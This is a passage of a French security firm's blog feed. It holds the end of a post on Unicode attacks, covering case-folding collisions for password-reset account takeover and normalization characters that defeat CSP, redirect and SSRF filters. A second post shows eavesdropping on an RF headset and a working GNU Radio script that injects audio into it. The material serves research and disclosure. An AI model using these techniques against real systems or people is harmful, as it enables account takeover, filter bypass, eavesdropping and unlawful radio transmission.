<div class="wp-block-image"><figure class="aligncenter"><img width="715" height="349" src="https://www.acceis.fr/voy_content/uploads/2022/04/this_is_fine.jpg" alt="unicode normalization" class="wp-image-1957" srcset="https://www.acceis.fr/voy_content/uploads/2022/04/this_is_fine.jpg 715w, https://www.acceis.fr/voy_content/uploads/2022/04/this_is_fine-300x146.jpg 300w, https://www.acceis.fr/voy_content/uploads/2022/04/this_is_fine-60x29.jpg 60w, https://www.acceis.fr/voy_content/uploads/2022/04/this_is_fine-100x49.jpg 100w, https://www.acceis.fr/voy_content/uploads/2022/04/this_is_fine-200x98.jpg 200w" sizes="(max-width: 715px) 100vw, 715px" /></figure></div>



<p>Cher lecteur, il est maintenant venu le temps pour moi de vous poser cette question : pouvez vous faire la différence entre<br><code>admin@HACKCEIS.pw</code> et <code>admin@HACKCEIS.pw</code> ?</p>



<p>Vous ne voyez pas, n’est-ce pas ?</p>



<div class="wp-block-image"><figure class="aligncenter"><img width="500" height="560" src="https://www.acceis.fr/voy_content/uploads/2022/04/They_are_the_same_picture.jpg" alt="unicode homoglyphs" class="wp-image-1956" srcset="https://www.acceis.fr/voy_content/uploads/2022/04/They_are_the_same_picture.jpg 500w, https://www.acceis.fr/voy_content/uploads/2022/04/They_are_the_same_picture-268x300.jpg 268w, https://www.acceis.fr/voy_content/uploads/2022/04/They_are_the_same_picture-54x60.jpg 54w, https://www.acceis.fr/voy_content/uploads/2022/04/They_are_the_same_picture-89x100.jpg 89w, https://www.acceis.fr/voy_content/uploads/2022/04/They_are_the_same_picture-179x200.jpg 179w" sizes="(max-width: 500px) 100vw, 500px" /></figure></div>



<p>Ce sont des homoglyphes, des caractères distincts qui se ressemblent étrangement mais ce n’est pas la confusion visuelle qui est intéressante ici. Ce qui est intéressant pour cette attaque, c’est que bien que deux caractères sont différents, une fois convertis en minuscules ceux-ci sont identiques.<code class="sourceCode javascript"><code class="sourceCode javascript"></code></code></p>



<ul><li>Le caractère Unicode <code>U+004B</code> (Latin Capital Letter K) deviendra le caractère <code>U+006B</code> (Latin Small Letter K) en<br>minuscule.</li><li>Le caractère Unicode <code>U+212A</code> (Kelvin Sign) deviendra le caractère <code>U+006B</code> (Latin Small Letter K) en minuscule.<code class="sourceCode javascript"><code class="sourceCode javascript"></code></code></li></ul>



<p>Autrement dit en langage mathématique, la transformation de casse (majuscule ou minuscule) en ASCII est une application bijective (en omettant les caractères invariants), alors que c’est une application surjective en Unicode, ce qui introduit un biais cognitif pour qui ne connaît pas les spécificités d’Unicode.<code class="sourceCode javascript"><code class="sourceCode javascript"></code></code></p>



<p>Voici une illustration en NodeJS :<code class="sourceCode javascript"><code class="sourceCode javascript"></code></code></p>



<pre class="wp-block-code"><code lang="javascript" class="language-javascript">&gt; a = "K";
'K'
&gt; b = "K";
'K'
&gt; a == b
false
&gt; a.toLowerCase() == b.toLowerCase()
true</code></pre>



<p>Pour revenir à l&#8217;exemple de réinitialisation de mot de passe, voici ce qui se passera en cas d&#8217;attaque de la part d&#8217;un acteur malveillant :</p>



<ol type="1"><li>L’attaquant fournit l’adresse email <code>admin@HACKCEIS.pw</code> (avec le symbole du Kelvin <code>U+212A</code>) qui est convertie en <code>admin@hackceis.pw</code> (collision par transformation de casse)</li><li>La condition est validée, <code>admin@hackceis.pw</code> existe dans la base de données</li><li>Le mot de passe temporaire ou le lien de réinitialisation unique est généré pour l’utilisateur Administrateur</li><li>L’email permettant de réinitialiser le mot de passe de l’Administrateur est envoyé à l’attaquant<code class="sourceCode javascript"><code class="sourceCode javascript"><code class="sourceCode javascript"></code></code></code></li></ol>



<p>L’attaque de prise de contrôle du compte a réussi.</p>



<h3 id="fractionnement-du-nom-dhôte"><span class="has-inline-color has-primary-color">Fractionnement du nom d’hôte</span><code class="sourceCode javascript"><code class="sourceCode javascript"><code class="sourceCode javascript"></code></code></code></h3>



<p>Le second exemple expose une attaque de <strong>Fractionnement du nom d’hôte</strong> (<em>Hostname splitting</em>) inspiré par la<br>présentation <em>Host/Split, Exploitable Antipatterns in Unicode Normalization</em> de Jonathan BIRCH (03-08/08/2019 à la <a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">BlackHat USA 2019</a>).</p>



<p>Cette fois-ci l’objet d’intérêt ne sera plus la transformation de casse mais les méthodes de normalisation.</p>



<p>En utilisant la méthode de normalisation NFKD (<em>Normalization Form Compatibility Decomposition)</em>) ou NFKC (<em>Normalization Fork Compatibility decomposition followed by canonical Composition</em>) le caractère Unicode <code>℀</code> (<code>U+2100</code>, Account Of) est transformé en <code>a</code> (<code>U+0061</code>) + <code>/&nbsp;</code>(<code>U+002F</code>)+ <code>c</code> (<code>U+0063</code>). En bref, <code>℀</code> :arrow_right: <code>a/c</code>.<code class="sourceCode javascript"><code class="sourceCode javascript"><code class="sourceCode javascript"></code></code></code></p>



<p>Voici deux illustrations en Ruby appliquées à une URL :<code class="sourceCode javascript"><code class="sourceCode javascript"><code class="sourceCode javascript"></code></code></code></p>



<pre class="wp-block-code"><code lang="ruby" class="language-ruby">url = 'https://acceis.c℀hat.client.com'
url.unicode_normalize(:nfkd) # =&gt; "https://acceis.ca/chat.client.com"
url.unicode_normalize(:nfkc) # =&gt; "https://acceis.ca/chat.client.com"

url = 'https://acceis.medi℀areer.client.com'
url.unicode_normalize(:nfkd) # =&gt; "https://acceis.media/career.client.com"
url.unicode_normalize(:nfkc) # =&gt; "https://acceis.media/career.client.com"
</code></pre>



<p>Cela permet de transformer une URL pointant vers un nom de domaine légitime en une URL pointant vers un nom de domaine maîtrisé par un attaquant.</p>



<p>Au moment où cette attaque a été identifiée, certains navigateurs web étaient vulnérables, le navigateur qui recevait un en-tête HTTP <code>Location</code> avec un tel nom de domaine le normalisait et redirigeait l’utilisateur vers le domaine normalisé permettant ainsi de détourner les secrets pouvant être contenus dans le corps de la requête.<br>Cette vulnérabilité est depuis bien longtemps corrigée dans les navigateurs web mais cette attaque peut toujours être utilisée pour contourner des mécanismes de sécurité basés sur des listes blanches dynamiques ou des expressions régulières. Par exemple contourner une CSP ayant la valeur suivante <code>Content-Security-Policy: default-src 'self' *.cdn.client.com</code>, des fonctions de vérification pour des redirections (ex : <code>redirect_url.match?(/.+\.client\.com/)</code>), autres filtres, contournement SSRF, contournement de WAF, etc..</p>



<p>L’utilisation du caractère Unicode <code>U+2100</code> pour cette attaque est contraignante. En effet, cela oblige l’attaquant à deux choses :</p>



<ul><li>Utiliser un nom de domaine malveillant ayant un TLD finissant en A : <code>.ca</code>, <code>.media</code>, <code>.ninja</code>, <code>.pizza</code>, <code>.mba</code>, <code>.moda</code>, etc.</li><li>Cibler un domaine ou sous-domaine de la victime commençant par C : <code>company.com</code>, <code>chat.client.com</code>, <code>career.client.com</code>, etc.</li></ul>



<p>Néanmoins le caractère Unicode <code>U+2100</code> n’est pas le seul permettant fractionner les URLs de manière intéressante.</p>



<ul><li><code>℁</code> (<code>U+2101</code>) &#x27a1;&#xfe0f; <code>a/s</code>, beaucoup d’autres similaires</li><li><code>⁈</code> (<code>U+2048</code>) &#x27a1;&#xfe0f; <code>?!</code>, passage en paramètre</li><li><code>／</code> (<code>U+FF0F</code>) &#x27a1;&#xfe0f; <code>/</code>, utilisation similaire à <code>℀</code> <code>U+2100</code> mais sans les contraintes, caractère le plus pratique pour le&nbsp; <em>hostname splitting</em></li><li><code>＃</code> (<code>U+FF03</code>) &#x27a1;&#xfe0f; <code>#</code>, passage en ancre</li><li><code>＠</code> (<code>U+FF20</code>) &#x27a1;&#xfe0f; <code>@</code>, passage de nom d’utilisateur <code>user＠cdn.client.com</code> &#x27a1;&#xfe0f; <code>user@cdn.client.com</code></li><li><code>：</code> (<code>U+FF1A</code>) &#x27a1;&#xfe0f; <code>:</code>, passage d’identifiants, <code>user：pass@secret.client.com</code> &#x27a1;&#xfe0f; <code>user:pass@secret.client.com</code>, peu utile</li><li><code>⒈</code> (<code>U+2488</code>) &#x27a1;&#xfe0f; <code>1.</code>,<code> 192.168.⒈1</code> &#x27a1;&#xfe0f; <code>192.168.1.1</code>, contournement de sécurité, exemple : SSRF avec expression régulière (<code>/(\b25[0-5]|\b2[0-4][0-9]|\b[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}/</code>)<br>interdisant les adresses IP</li></ul>



<div class="wp-block-image"><figure class="aligncenter"><img width="735" height="749" src="https://www.acceis.fr/voy_content/uploads/2022/04/honey.jpg" alt="unicode joke" class="wp-image-1955" srcset="https://www.acceis.fr/voy_content/uploads/2022/04/honey.jpg 735w, https://www.acceis.fr/voy_content/uploads/2022/04/honey-294x300.jpg 294w, https://www.acceis.fr/voy_content/uploads/2022/04/honey-60x60.jpg 60w, https://www.acceis.fr/voy_content/uploads/2022/04/honey-98x100.jpg 98w, https://www.acceis.fr/voy_content/uploads/2022/04/honey-196x200.jpg 196w" sizes="(max-width: 735px) 100vw, 735px" /></figure></div>



<h2 id="à-propos-de-lauteur"><span class="has-inline-color has-black-color">À propos de l’auteur</span></h2>



<p>Article et présentation rédigés par Alexandre ZANNI aka <a href="https://pwn.by/noraj/">noraj</a>, Ingénieur en Test d’Intrusion chez<br><a href="https://www.acceis.fr/">ACCEIS</a>.</p>
<p>The post <a rel="nofollow" href="https://www.acceis.fr/attaques-unicode-rump-breizhctf-2k22/">Attaques Unicode &#8211; Rump BreizhCTF 2k22</a> appeared first on <a rel="nofollow" href="https://www.acceis.fr">ACCEIS</a>.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Comment rééduquer les goûts musicaux de vos collègues ?</title>
		<link>https://www.acceis.fr/comment-reeduquer-les-gouts-musicaux-de-vos-collegues/</link>
		
		<dc:creator><![CDATA[Rémi Assidi]]></dc:creator>
		<pubDate>Thu, 24 Mar 2022 05:36:40 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[Outils et méthodes]]></category>
		<category><![CDATA[BladeRF]]></category>
		<category><![CDATA[fréquence]]></category>
		<category><![CDATA[gnuradio]]></category>
		<category><![CDATA[gqrx]]></category>
		<category><![CDATA[radio]]></category>
		<category><![CDATA[SDR]]></category>
		<guid isPermaLink="false">https://www.acceis.fr/?p=1568</guid>

					<description><![CDATA[<p>Renseignez-vous sur le matos de votre cible Comme à mon habitude au sein d’ACCEIS, je suis arrivé le matin avec l’idée en tête de nouer des relations encore meilleures avec mes collègues. En déambulant, mon œil a naturellement été guidé vers un bureau vide avec la porte grande ouverte. Porté à la fois par une [&#8230;]</p>
<p>The post <a rel="nofollow" href="https://www.acceis.fr/comment-reeduquer-les-gouts-musicaux-de-vos-collegues/">Comment rééduquer les goûts musicaux de vos collègues ?</a> appeared first on <a rel="nofollow" href="https://www.acceis.fr">ACCEIS</a>.</p>
]]></description>
										<content:encoded><![CDATA[
<h3><span class="has-inline-color has-primary-color">Renseignez-vous sur le matos de votre cible</span></h3>



<p>Comme à mon habitude au sein d’ACCEIS, je suis arrivé le matin avec l’idée en tête de nouer des relations encore meilleures avec mes collègues.</p>



<p>En déambulant, mon œil a naturellement été guidé vers un bureau vide avec la porte grande ouverte. Porté à la fois par une part importante de curiosité ainsi que part une irrésistible envie de faire une connerie, je me suis introduit sans plus attendre dans le bureau.</p>



<p class="has-text-align-center"><img src="https://lh6.googleusercontent.com/Dmn1afPzlhY3M2so00vXYj1pV2m9Jf1pfwt0Rwa_qdRPl1nxf9t2nUt6ayQyDdze5_l585ExbXAJD85nb1MFVLgqhFytUrVyS5aNxCsuL8Y8sVQQHZx5AybaWeaEPN199A" width="249" height="333"></p>



<p>Aucun ordinateur n’étant présent, j’ai donc abandonné la possibilité d’un croissantage pour le lendemain, cependant j’ai rapidement aperçu un casque audio muni d’une base que je ne connaissais pas. Par ailleurs, son fonctionnement ne m’a pas paru conventionnel.</p>



<p class="has-text-align-center"><img src="https://lh6.googleusercontent.com/Uh57A4LGAzGNQsMHXJCZzmrf1QuVBS-mymCO1SIsJD6r37mLTdZumg8DYMWJ3eg8uoMuBzXCaGpkVGOIAixuQmEFrN2JBOPKNto-zE-69_sIgzDPYLfUNK0FswcNcTmC6Q" style="width: 250px"></p>



<p>Après avoir pris quelques photos pour obtenir les caractéristiques de base, je suis revenu à mon bureau et j’ai commencé à me renseigner plus en détail sur la marque et le modèle de ce casque.</p>



<p>Après avoir réussi à trouver la référence du produit, je me suis rendu compte d’une caractéristique importante. Le casque audio en question fonctionne sur de la radio fréquence (RF). C’est le modèle RS 120 II de la marque Sennheiser, le produit est décrit comme étant un ensemble émetteur UHF et casque sans fil. La base se branche en Jack et re-diffuse le signal reçu sur une modulation FM.</p>



<p>La fiche technique du casque nous apprend plusieurs caractéristiques importantes :</p>



<ol><li>La base à une portée totale de 100 mètres</li><li>Modulation FM Stéréo</li><li>Gamme de fréquences UHF : 863 à 865 MHz</li></ol>



<p>Les spécifications trouvées correspondent à celles affichées sur la base.</p>



<div class="wp-container-14 wp-block-columns">
<div class="wp-container-12 wp-block-column">
<figure class="wp-block-image size-large is-resized"><img src="https://www.acceis.fr/voy_content/uploads/2021/11/a-736x1024.jpg" alt="" class="wp-image-1582" width="370" height="472" /></figure>
</div>



<div class="wp-container-13 wp-block-column">
<figure class="wp-block-image size-full is-resized"><img src="https://www.acceis.fr/voy_content/uploads/2021/11/b.png" alt="" class="wp-image-1583" width="429" height="431" /></figure>
</div>
</div>



<p>La gamme de fréquence correspond à une plage RF dans la catégorie des UHF réservées aux “microphones sans fil” (863 à 865 MHz).</p>



<h3><span class="has-inline-color has-primary-color">Commencez l’espionnage</span></h3>



<p>D’après les renseignements précédemment récupérés, la gamme de fréquence d’émission de la base est comprise entre 863 et 865 MHz.</p>



<p>Pourquoi ne pas essayer d’écouter sur celle-ci ?</p>



<p>J’ai donc cherché dans la réserve d’ACCEIS aussi appelée No man&#8217;s land.</p>



<p>Après moultes péripéties, j’ai enfin trouvé une boîte pouvant contenir ce que je cherche. Ainsi qu&#8217;une casquette de capitaine plutôt chouette.</p>



<div class="wp-block-image"><figure class="aligncenter is-resized"><img src="https://lh6.googleusercontent.com/CrlZu8iD5ZIZHFbVdoAwfNK83hJAlU6eOTihAbhOjsAnaq8SCSkZzArDLEhYwMwHGSbZ7qD0JpmDhrJArSt1-zqC59bQmUpyi-w8ncgWjUwoypkvqQMdI_MWX-_4rwnBbQ" alt="" width="451" height="337" /></figure></div>



<p>Grâce à la magie de Noël et à l’aide du père Noël, je suis tombé sur un magnifique BladeRF A4 Full-Duplex avec deux antennes RX et deux antennes TX.&nbsp;</p>



<div class="wp-block-image"><figure class="aligncenter is-resized"><img src="https://lh5.googleusercontent.com/CFdH8PFOZIoYJRAtahgYZsZsBBxjwsuUy5mDX1calKTH6f4PRpSe1WlguLe05N72Lpq0n1rr6XopFAmyIhry5lZFAw45i_Hj1-SL9pdpe21PVBWX_F98jX_W92sOcwwKfA" alt="" width="509" height="680" /></figure></div>



<p>C’est maintenant que les choses intéressantes vont commencer.</p>



<p>Après une installation somme toute assez rapide :</p>



<pre class="wp-block-code"><code lang="bash" class="language-bash">sudo add-apt-repository ppa:nuandllc/bladerf
sudo apt update
sudo apt install -y bladerf
sudo apt-get install bladerf-fpga-hostedxa4   # for bladeRF 2.0 Micro A4</code></pre>



<p>Une mise à jour du firmware :</p>



<pre class="wp-block-code"><code lang="bash" class="language-bash">bladeRF-cli --flash-firmware /usr/share/Nuand/bladeRF/bladeRF_fw.img</code></pre>



<p>Et l’upload du FPGA :</p>



<pre class="wp-block-code"><code lang="bash" class="language-bash">bladeRF-cli -l /usr/share/Nuand/bladeRF/hostedxA4.rbf</code></pre>



<p>Il ne me reste plus qu’à le calibrer :</p>



<pre class="wp-block-code"><code lang="bash" class="language-bash">$ bladeRF-cli -i 
bladeRF&gt; cal dc rx 
RX DC I: Value = -1984, Error = 2.053 
RX DC Q: Value = -1824, Error = 12.256</code></pre>



<p>Tout est prêt du point de vue du BladeRF, maintenant pour l’écoute, je vais utiliser gqrx qui est un SDR open source.</p>



<p>Une petite installation :</p>



<pre class="wp-block-code"><code lang="bash" class="language-bash">sudo apt install -y gqrx-sdr</code></pre>



<p>Démarrons notre espionnage en bonne et due forme. D’après les specs techniques, on sait que l’émetteur émet sur une fréquence (qui peut varier) entre 863 et 865 MHz.</p>



<p>Nous trouvons le signal audio sur la fréquence 863.348 MHz.</p>



<figure class="wp-block-video"><video controls src="https://www.acceis.fr/voy_content/uploads/2021/11/Initiale.webm"></video></figure>



<p>Comme il est possible de l’entendre sur cet enregistrement, notre cible écoute des musiques d’un goût… assez particulier. En tout état de cause, un redressement culturel s&#8217;impose.&nbsp;</p>



<p>Après un peu plus de recherche, je m&#8217;aperçois que le signal est visible sur d’autres harmoniques, sur des fréquences différentes qui sortent de l&#8217;intervalle donné par le constructeur, et de l’intervalle réglementaire pour ce type d’usage.</p>



<p>La première harmonique se trouve sur la fréquence 172.801MHz.</p>



<figure class="wp-block-video"><video controls src="https://www.acceis.fr/voy_content/uploads/2021/11/Harmonique_1.webm"></video></figure>



<p>Après un peu plus de recherche, on observe la présence d&#8217;harmoniques dans les très Hautes Fréquences (288.657 MHz).</p>



<figure class="wp-block-video"><video controls src="https://www.acceis.fr/voy_content/uploads/2021/11/Harmonique_2.webm"></video></figure>



<p>C’est une fréquence réservée à plusieurs utilisations notamment liées au spatial, à l’aéronautique et au domaine militaire.</p>



<p>Les bandes 225,000 à 400,000 MHz sont indiquées comme étant réservées pour : <a href="https://fr.wikipedia.org/wiki/Radiocommunication_a%C3%A9ronautique#Sous-bande_UHF">l&#8217;aéronautique UHF</a>, liaisons satellitaires, militaires, <a href="https://fr.wikipedia.org/wiki/ACROPOL">ACROPOL</a> et celles comprises entre 225 MHz à 326,5 MHz sont dédiées à <a href="https://fr.wikipedia.org/wiki/Radiocommunication_a%C3%A9ronautique#Sous-bande_UHF">l&#8217;aéronautique UHF</a> <a href="https://fr.wikipedia.org/wiki/Militaire">militaire</a>, contrôle espace aérien supérieur, service aérospatial.</p>



<p>S&#8217;il est vrai que changer les goûts musicaux de ses collègues peut se révéler utile, participer à la rééducation musicale d’un pilote de chasse est une perspective beaucoup plus intéressante. Pour peu qu’il passe au-dessus du bâtiment (rayon 100 mètres), nous aurons ainsi tout le loisir de lui envoyer quelques notes de musique pour les quelques secondes de survol.</p>



<h3><span class="has-inline-color has-primary-color">Injectez 2, 3 répliques de film durant une conf call</span></h3>



<p>Nous pouvons espionner notre collègue, maintenant il serait intéressant de savoir si l&#8217;émission sur cette même fréquence permet d’injecter de l’audio sur le casque.</p>



<p>Le plus simple (enfin tout est relatif) c’est d’installer gnuradio et de construire un programme prenant en entrée un fichier audio (voire un micro) puis d’effectuer les modulations permettant l’envoi en FM.</p>



<p>Donc pour l’installation, un simple :</p>



<pre class="wp-block-code"><code lang="bash" class="language-bash">sudo apt install gnuradio</code></pre>



<p>Maintenant, il ne nous reste plus qu’à construire le programme.&nbsp;</p>



<p>Après quelques recherches, afin de moduler un fichier wav en fm, il suffit d’encoder notre source avec du CVSD et d’appliquer une modulation GSMK.</p>



<p>CVSD ou Continuously Slope Delta Modulation est une méthode d’encodage de la voix.</p>



<p>GMSK ou Gaussian Minimum Shift Keying est une modulation remplaçant les impulsions rectangulaires par des impulsions gaussiennes.</p>



<p>Il ne reste qu’à tout mettre ensemble sur gnuradio.</p>



<p class="has-text-align-center"><img src="https://lh6.googleusercontent.com/Bb-aA0fqCdMVglDNun4twQCyuwyq6fYBOnNcnXhk8X346-IB9DLhziTu9Dz9M5lmFHasM-Y2aZVv3n-5f6RNqFcPfeqypYTwass3XbiFVbeg0bGKfPN-s2Zg713c2dUqCg" style="width: 1000px"></p>



<p>Pour notre audio, je vais utiliser le bloc Wav File Source (mais il est aussi possible de choisir le bloc lié au micro). Le flux audio est encodé en CVSD avec un échantillonnage de 8 et une Bandwidth de 500m. Je le module ensuite en GMSK et l’envoie à la sortie dans le bloc d’émission du BladeRF.&nbsp;</p>



<p>Afin de rendre les variables configurables, j’ajoute des blocs GUI. Ils vont nous créer des éléments graphiques permettant de modifier nos variables pendant l&#8217;exécution du programme.&nbsp;</p>



<div class="wp-block-image"><figure class="aligncenter"><img src="https://lh3.googleusercontent.com/_I-VGc04LzDptMHc-fYME4tmmGLdv018_GEQiJMA56tkQc01uZx1PnSnVU0uhMzcJltWGYwoMjLVDVguVaA4ax5CFvzcyRCjanOC7VrQQjGq6DWkQ9JeJSeeuHrM749dDw" alt="" /><figcaption>Programme final avec bloc graphique</figcaption></figure></div>



<p>Les GUI Range affichent des curseurs et Sink affiche en temps réel le flux.</p>



<p>Il ne reste plus qu&#8217;à télécharger des répliques du Grand Détournement pour les envoyer sur le casque de notre cher collègue.</p>



<figure class="wp-block-video"><video controls src="https://www.acceis.fr/voy_content/uploads/2022/03/28.mp4"></video></figure>



<p>Maintenant arrive l’heure du test.</p>



<div class="wp-container-18 wp-block-columns">
<div class="wp-container-15 wp-block-column" style="flex-basis:33.34%"></div>



<div class="wp-container-16 wp-block-column" style="flex-basis:33.34%">
<figure class="wp-block-video"><video controls src="https://www.acceis.fr/voy_content/uploads/2021/11/output.mp4"></video></figure>
</div>



<div class="wp-container-17 wp-block-column" style="flex-basis:33.33%"></div>
</div>



<p>Tout fonctionne à merveille !</p>



<h3><span class="has-inline-color has-primary-color">Finissez par une rééducation de leurs goûts musicaux</span></h3>



<p>Notre fabuleux programme en bloc Gnu_Radio fonctionne parfaitement, mais il est un peu contraignant à utiliser, c’est pourquoi, je vais l’exporter en python afin, je ne sais pas, de le faire tourner sur un raspberry…</p>



<p>Rien de plus simple.</p>



<div class="wp-block-image"><figure class="aligncenter"><img src="https://lh6.googleusercontent.com/_BzzNgvkN80tSdjcUspuLtu5mr9bYy1YdIgoCkwSKrk91E9mWd_Kbm_xtcgMVlxhW5YGNwG-RPwITin6t4ysuOfTz4G1DUfnPVzkCQEDBZY6NfTxRrkM4Kk0rfvo_QCTgA" alt="" /></figure></div>



<p>Il suffit de se rendre dans l’onglet Run puis Generate et nous obtenons en sortie notre fichier en python.</p>



<pre class="wp-block-code"><code lang="bash" class="language-bash">[bladeRF sink] bladerf_sink_c: DEBUG: initialization complete
[bladeRF sink] start: DEBUG: starting sink
[bladeRF sink] stop: DEBUG: stopping sink
&gt;&gt;&gt; Done
Generating: '/home/remi/Tools/SDR/Gnu_Radio/top_block.py'</code></pre>



<p>Maintenant, il nous est possible de le modifier afin de passer des extraits des artistes les plus prolifiques de notre temps. Rihanna, Cindy Sander, Keen&#8217;V, les possibilités sont infinies. A ne pas oublier, le programme est également portable, il suffit de brancher notre BladeRF sur un raspberry, d’installer les packages précédents et le tour est joué.&nbsp;</p>



<pre class="wp-block-code"><code lang="python" class="language-python">#!/usr/bin/env python3
# -*- coding: utf-8 -*-
 
#
# SPDX-License-Identifier: GPL-3.0
#
# GNU Radio Python Flow Graph
# Title: Top Block
# GNU Radio version: 3.8.2.0
 
from gnuradio import blocks
from gnuradio import digital
from gnuradio import gr
from gnuradio.filter import firdes
import sys
import signal
import os
import random
from argparse import ArgumentParser
from gnuradio.eng_arg import eng_float, intx
from gnuradio import eng_notation
from gnuradio import vocoder
import osmosdr
import time
 
 
class top_block(gr.top_block):
 
   def __init__(self):
       gr.top_block.__init__(self, "Top Block")
 
       ##################################################
       # Variables
       ##################################################
       self.Bandwidth = Bandwidth = 20000000
 
       ##################################################
       # Blocks
       ##################################################
       self.vocoder_cvsd_encode_fb_0 = vocoder.cvsd_encode_fb(8,0.5)
       self.osmosdr_sink_0 = osmosdr.sink(
           args="numchan=" + str(1) + " " + ''
       )
       self.osmosdr_sink_0.set_time_now(osmosdr.time_spec_t(time.time()), osmosdr.ALL_MBOARDS)
       self.osmosdr_sink_0.set_sample_rate(686000)
       self.osmosdr_sink_0.set_center_freq(863346000, 0)
       #self.osmosdr_sink_0.set_center_freq(104700000, 0)
       self.osmosdr_sink_0.set_freq_corr(0, 0)
       self.osmosdr_sink_0.set_gain(100, 0)
       self.osmosdr_sink_0.set_if_gain(15, 0)
       self.osmosdr_sink_0.set_bb_gain(15, 0)
       self.osmosdr_sink_0.set_antenna('TX2', 0)
       self.osmosdr_sink_0.set_bandwidth(20000, 0)
       self.digital_gmsk_mod_0 = digital.gmsk_mod(
           samples_per_symbol=2,
           bt=0.1,
           verbose=False,
           log=False)
       self.blocks_wavfile_source_0_0 = blocks.wavfile_source('./Top_Rihanna/' + random.choice(os.listdir("./Top_Rihanna/")), False)
       self.blocks_multiply_const_vxx_1 = blocks.multiply_const_cc(1)
 
       ##################################################
       # Connections
       ##################################################
       self.connect((self.blocks_multiply_const_vxx_1, 0), (self.osmosdr_sink_0, 0))
       self.connect((self.blocks_wavfile_source_0_0, 0), (self.vocoder_cvsd_encode_fb_0, 0))
       self.connect((self.digital_gmsk_mod_0, 0), (self.blocks_multiply_const_vxx_1, 0))
       self.connect((self.vocoder_cvsd_encode_fb_0, 0), (self.digital_gmsk_mod_0, 0))
 
 
   def get_Bandwidth(self):
       return self.Bandwidth
 
   def set_Bandwidth(self, Bandwidth):
       self.Bandwidth = Bandwidth
 
def main(top_block_cls=top_block, options=None):
   tb = top_block_cls()
 
   def sig_handler(sig=None, frame=None):
       tb.stop()
       tb.wait()
 
   signal.signal(signal.SIGINT, sig_handler)
   signal.signal(signal.SIGTERM, sig_handler)
 
   tb.start()
 
   try:
       input('Press Enter to quit \n')
   except:
       pass
   tb.stop()
   tb.wait()
 
 
if __name__ == '__main__':
   main()
</code></pre>



<p>Vous voilà maintenant prêt à entamer une rééducation des goûts musicaux de vos collègues !</p>



<h3><span class="has-inline-color has-primary-color">Conclusion (Amélioration de leurs goûts musicaux&nbsp; ?)</span></h3>



<p>Avant de conclure, il est clair que ce fut une fructueuse journée de travail !</p>



<p>En définitive, l’utilisation d’un casque RF au travail peut se révéler être à double tranchant, sauf si vous êtes ouvert à ce que vos collègues puissent entendre ce que vous écoutez et vous faire écouter n’importe quelle playlist.</p>



<p>Ce casque présente visiblement des défauts de conception, en particulier à cause de la présence d&#8217;harmoniques sur des fréquences d&#8217;émission non standards. Il est également possible d’émettre sur le casque même lorsque la base est débranchée.</p>



<p>N&#8217;importe qui, dans un rayon de ~100 mètres, peut vous écouter à votre insu en faisant de l’écoute passive.</p>



<p>Attention à ce que vous achetez 😉</p>



<h3 id="à-propos-de-lauteur"><span class="has-inline-color has-primary-color">À propos de l’auteur</span></h3>



<p>Article et présentation rédigés par Rémi ASSIDI, apprenti auditeur sécurité chez <a href="https://www.acceis.fr/">ACCEIS</a>.</p>


<div class="taxonomy-post_tag wp-block-post-terms"><a href="https://www.acceis.fr/tag/bladerf/" rel="tag">BladeRF</a><span class="wp-block-post-terms__separator">, </span><a href="https://www.acceis.fr/tag/frequence/" rel="tag">fréquence</a><span class="wp-block-post-terms__separator">, </span><a href="https://www.acceis.fr/tag/gnuradio/" rel="tag">gnuradio</a><span class="wp-block-post-terms__separator">, </span><a href="https://www.acceis.fr/tag/gqrx/" rel="tag">gqrx</a><span class="wp-block-post-terms__separator">, </span><a href="https://www.acceis.fr/tag/radio/" rel="tag">radio</a><span class="wp-block-post-terms__separator">, </span><a href="https://www.acceis.fr/tag/sdr/" rel="tag">SDR</a></div>


<p></p>
<p>The post <a rel="nofollow" href="https://www.acceis.fr/comment-reeduquer-les-gouts-musicaux-de-vos-collegues/">Comment rééduquer les goûts musicaux de vos collègues ?</a> appeared first on <a rel="nofollow" href="https://www.acceis.fr">ACCEIS</a>.</p>
]]></content:encoded>
					
		
		<enclosure url="https://www.acceis.fr/voy_content/uploads/2021/11/Initiale.webm" length="4359728" type="video/webm" />
<enclosure url="https://www.acceis.fr/voy_content/uploads/2021/11/Harmonique_1.webm" length="3469217" type="video/webm" />
<enclosure url="https://www.acceis.fr/voy_content/uploads/2021/11/Harmonique_2.webm" length="6267416" type="video/webm" />
<enclosure url="https://www.acceis.fr/voy_content/uploads/2022/03/28.mp4" length="612999" type="video/mp4" />
<enclosure url="https://www.acceis.fr/voy_content/uploads/2021/11/output.mp4" length="12195131" type="video/mp4" />

			</item>
		<item>
		<title>Analyse de la vulnérabilité CVE-2021-22205</title>
		<link>https://www.acceis.fr/analyse-de-la-vulnerabilite-cve-2021-22205/</link>
		
		<dc:creator><![CDATA[Yves DUCHESNE]]></dc:creator>
		<pubDate>Mon, 22 Nov 2021 11:48:44 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[Outils et méthodes]]></category>
		<category><![CDATA[hardening]]></category>
		<category><![CDATA[méthodologie]]></category>
		<category><![CDATA[outils]]></category>
		<category><![CDATA[systemd]]></category>
		<guid isPermaLink="false">https://www.acceis.fr/?p=1463</guid>

					<description><![CDATA[<p>En avril dernier, Gitlab a fait publié un correctif de sécurité concernant une vulnérabilité d&#8217;exécution de code à distance non authentifiée sur son application web. Particulièrement critique, cette vulnérabilité (CVE-2021-22205) a fait l&#8217;objet d&#8217;un score CVSS de 9.9. Plus récemment, des exploitations in the wild ont été identifiées sur des instances exposées. Plusieurs analyses techniques [&#8230;]</p>
<p>The post <a rel="nofollow" href="https://www.acceis.fr/analyse-de-la-vulnerabilite-cve-2021-22205/">Analyse de la vulnérabilité CVE-2021-22205</a> appeared first on <a rel="nofollow" href="https://www.acceis.fr">ACCEIS</a>.</p>
]]></description>
										<content:encoded><![CDATA[
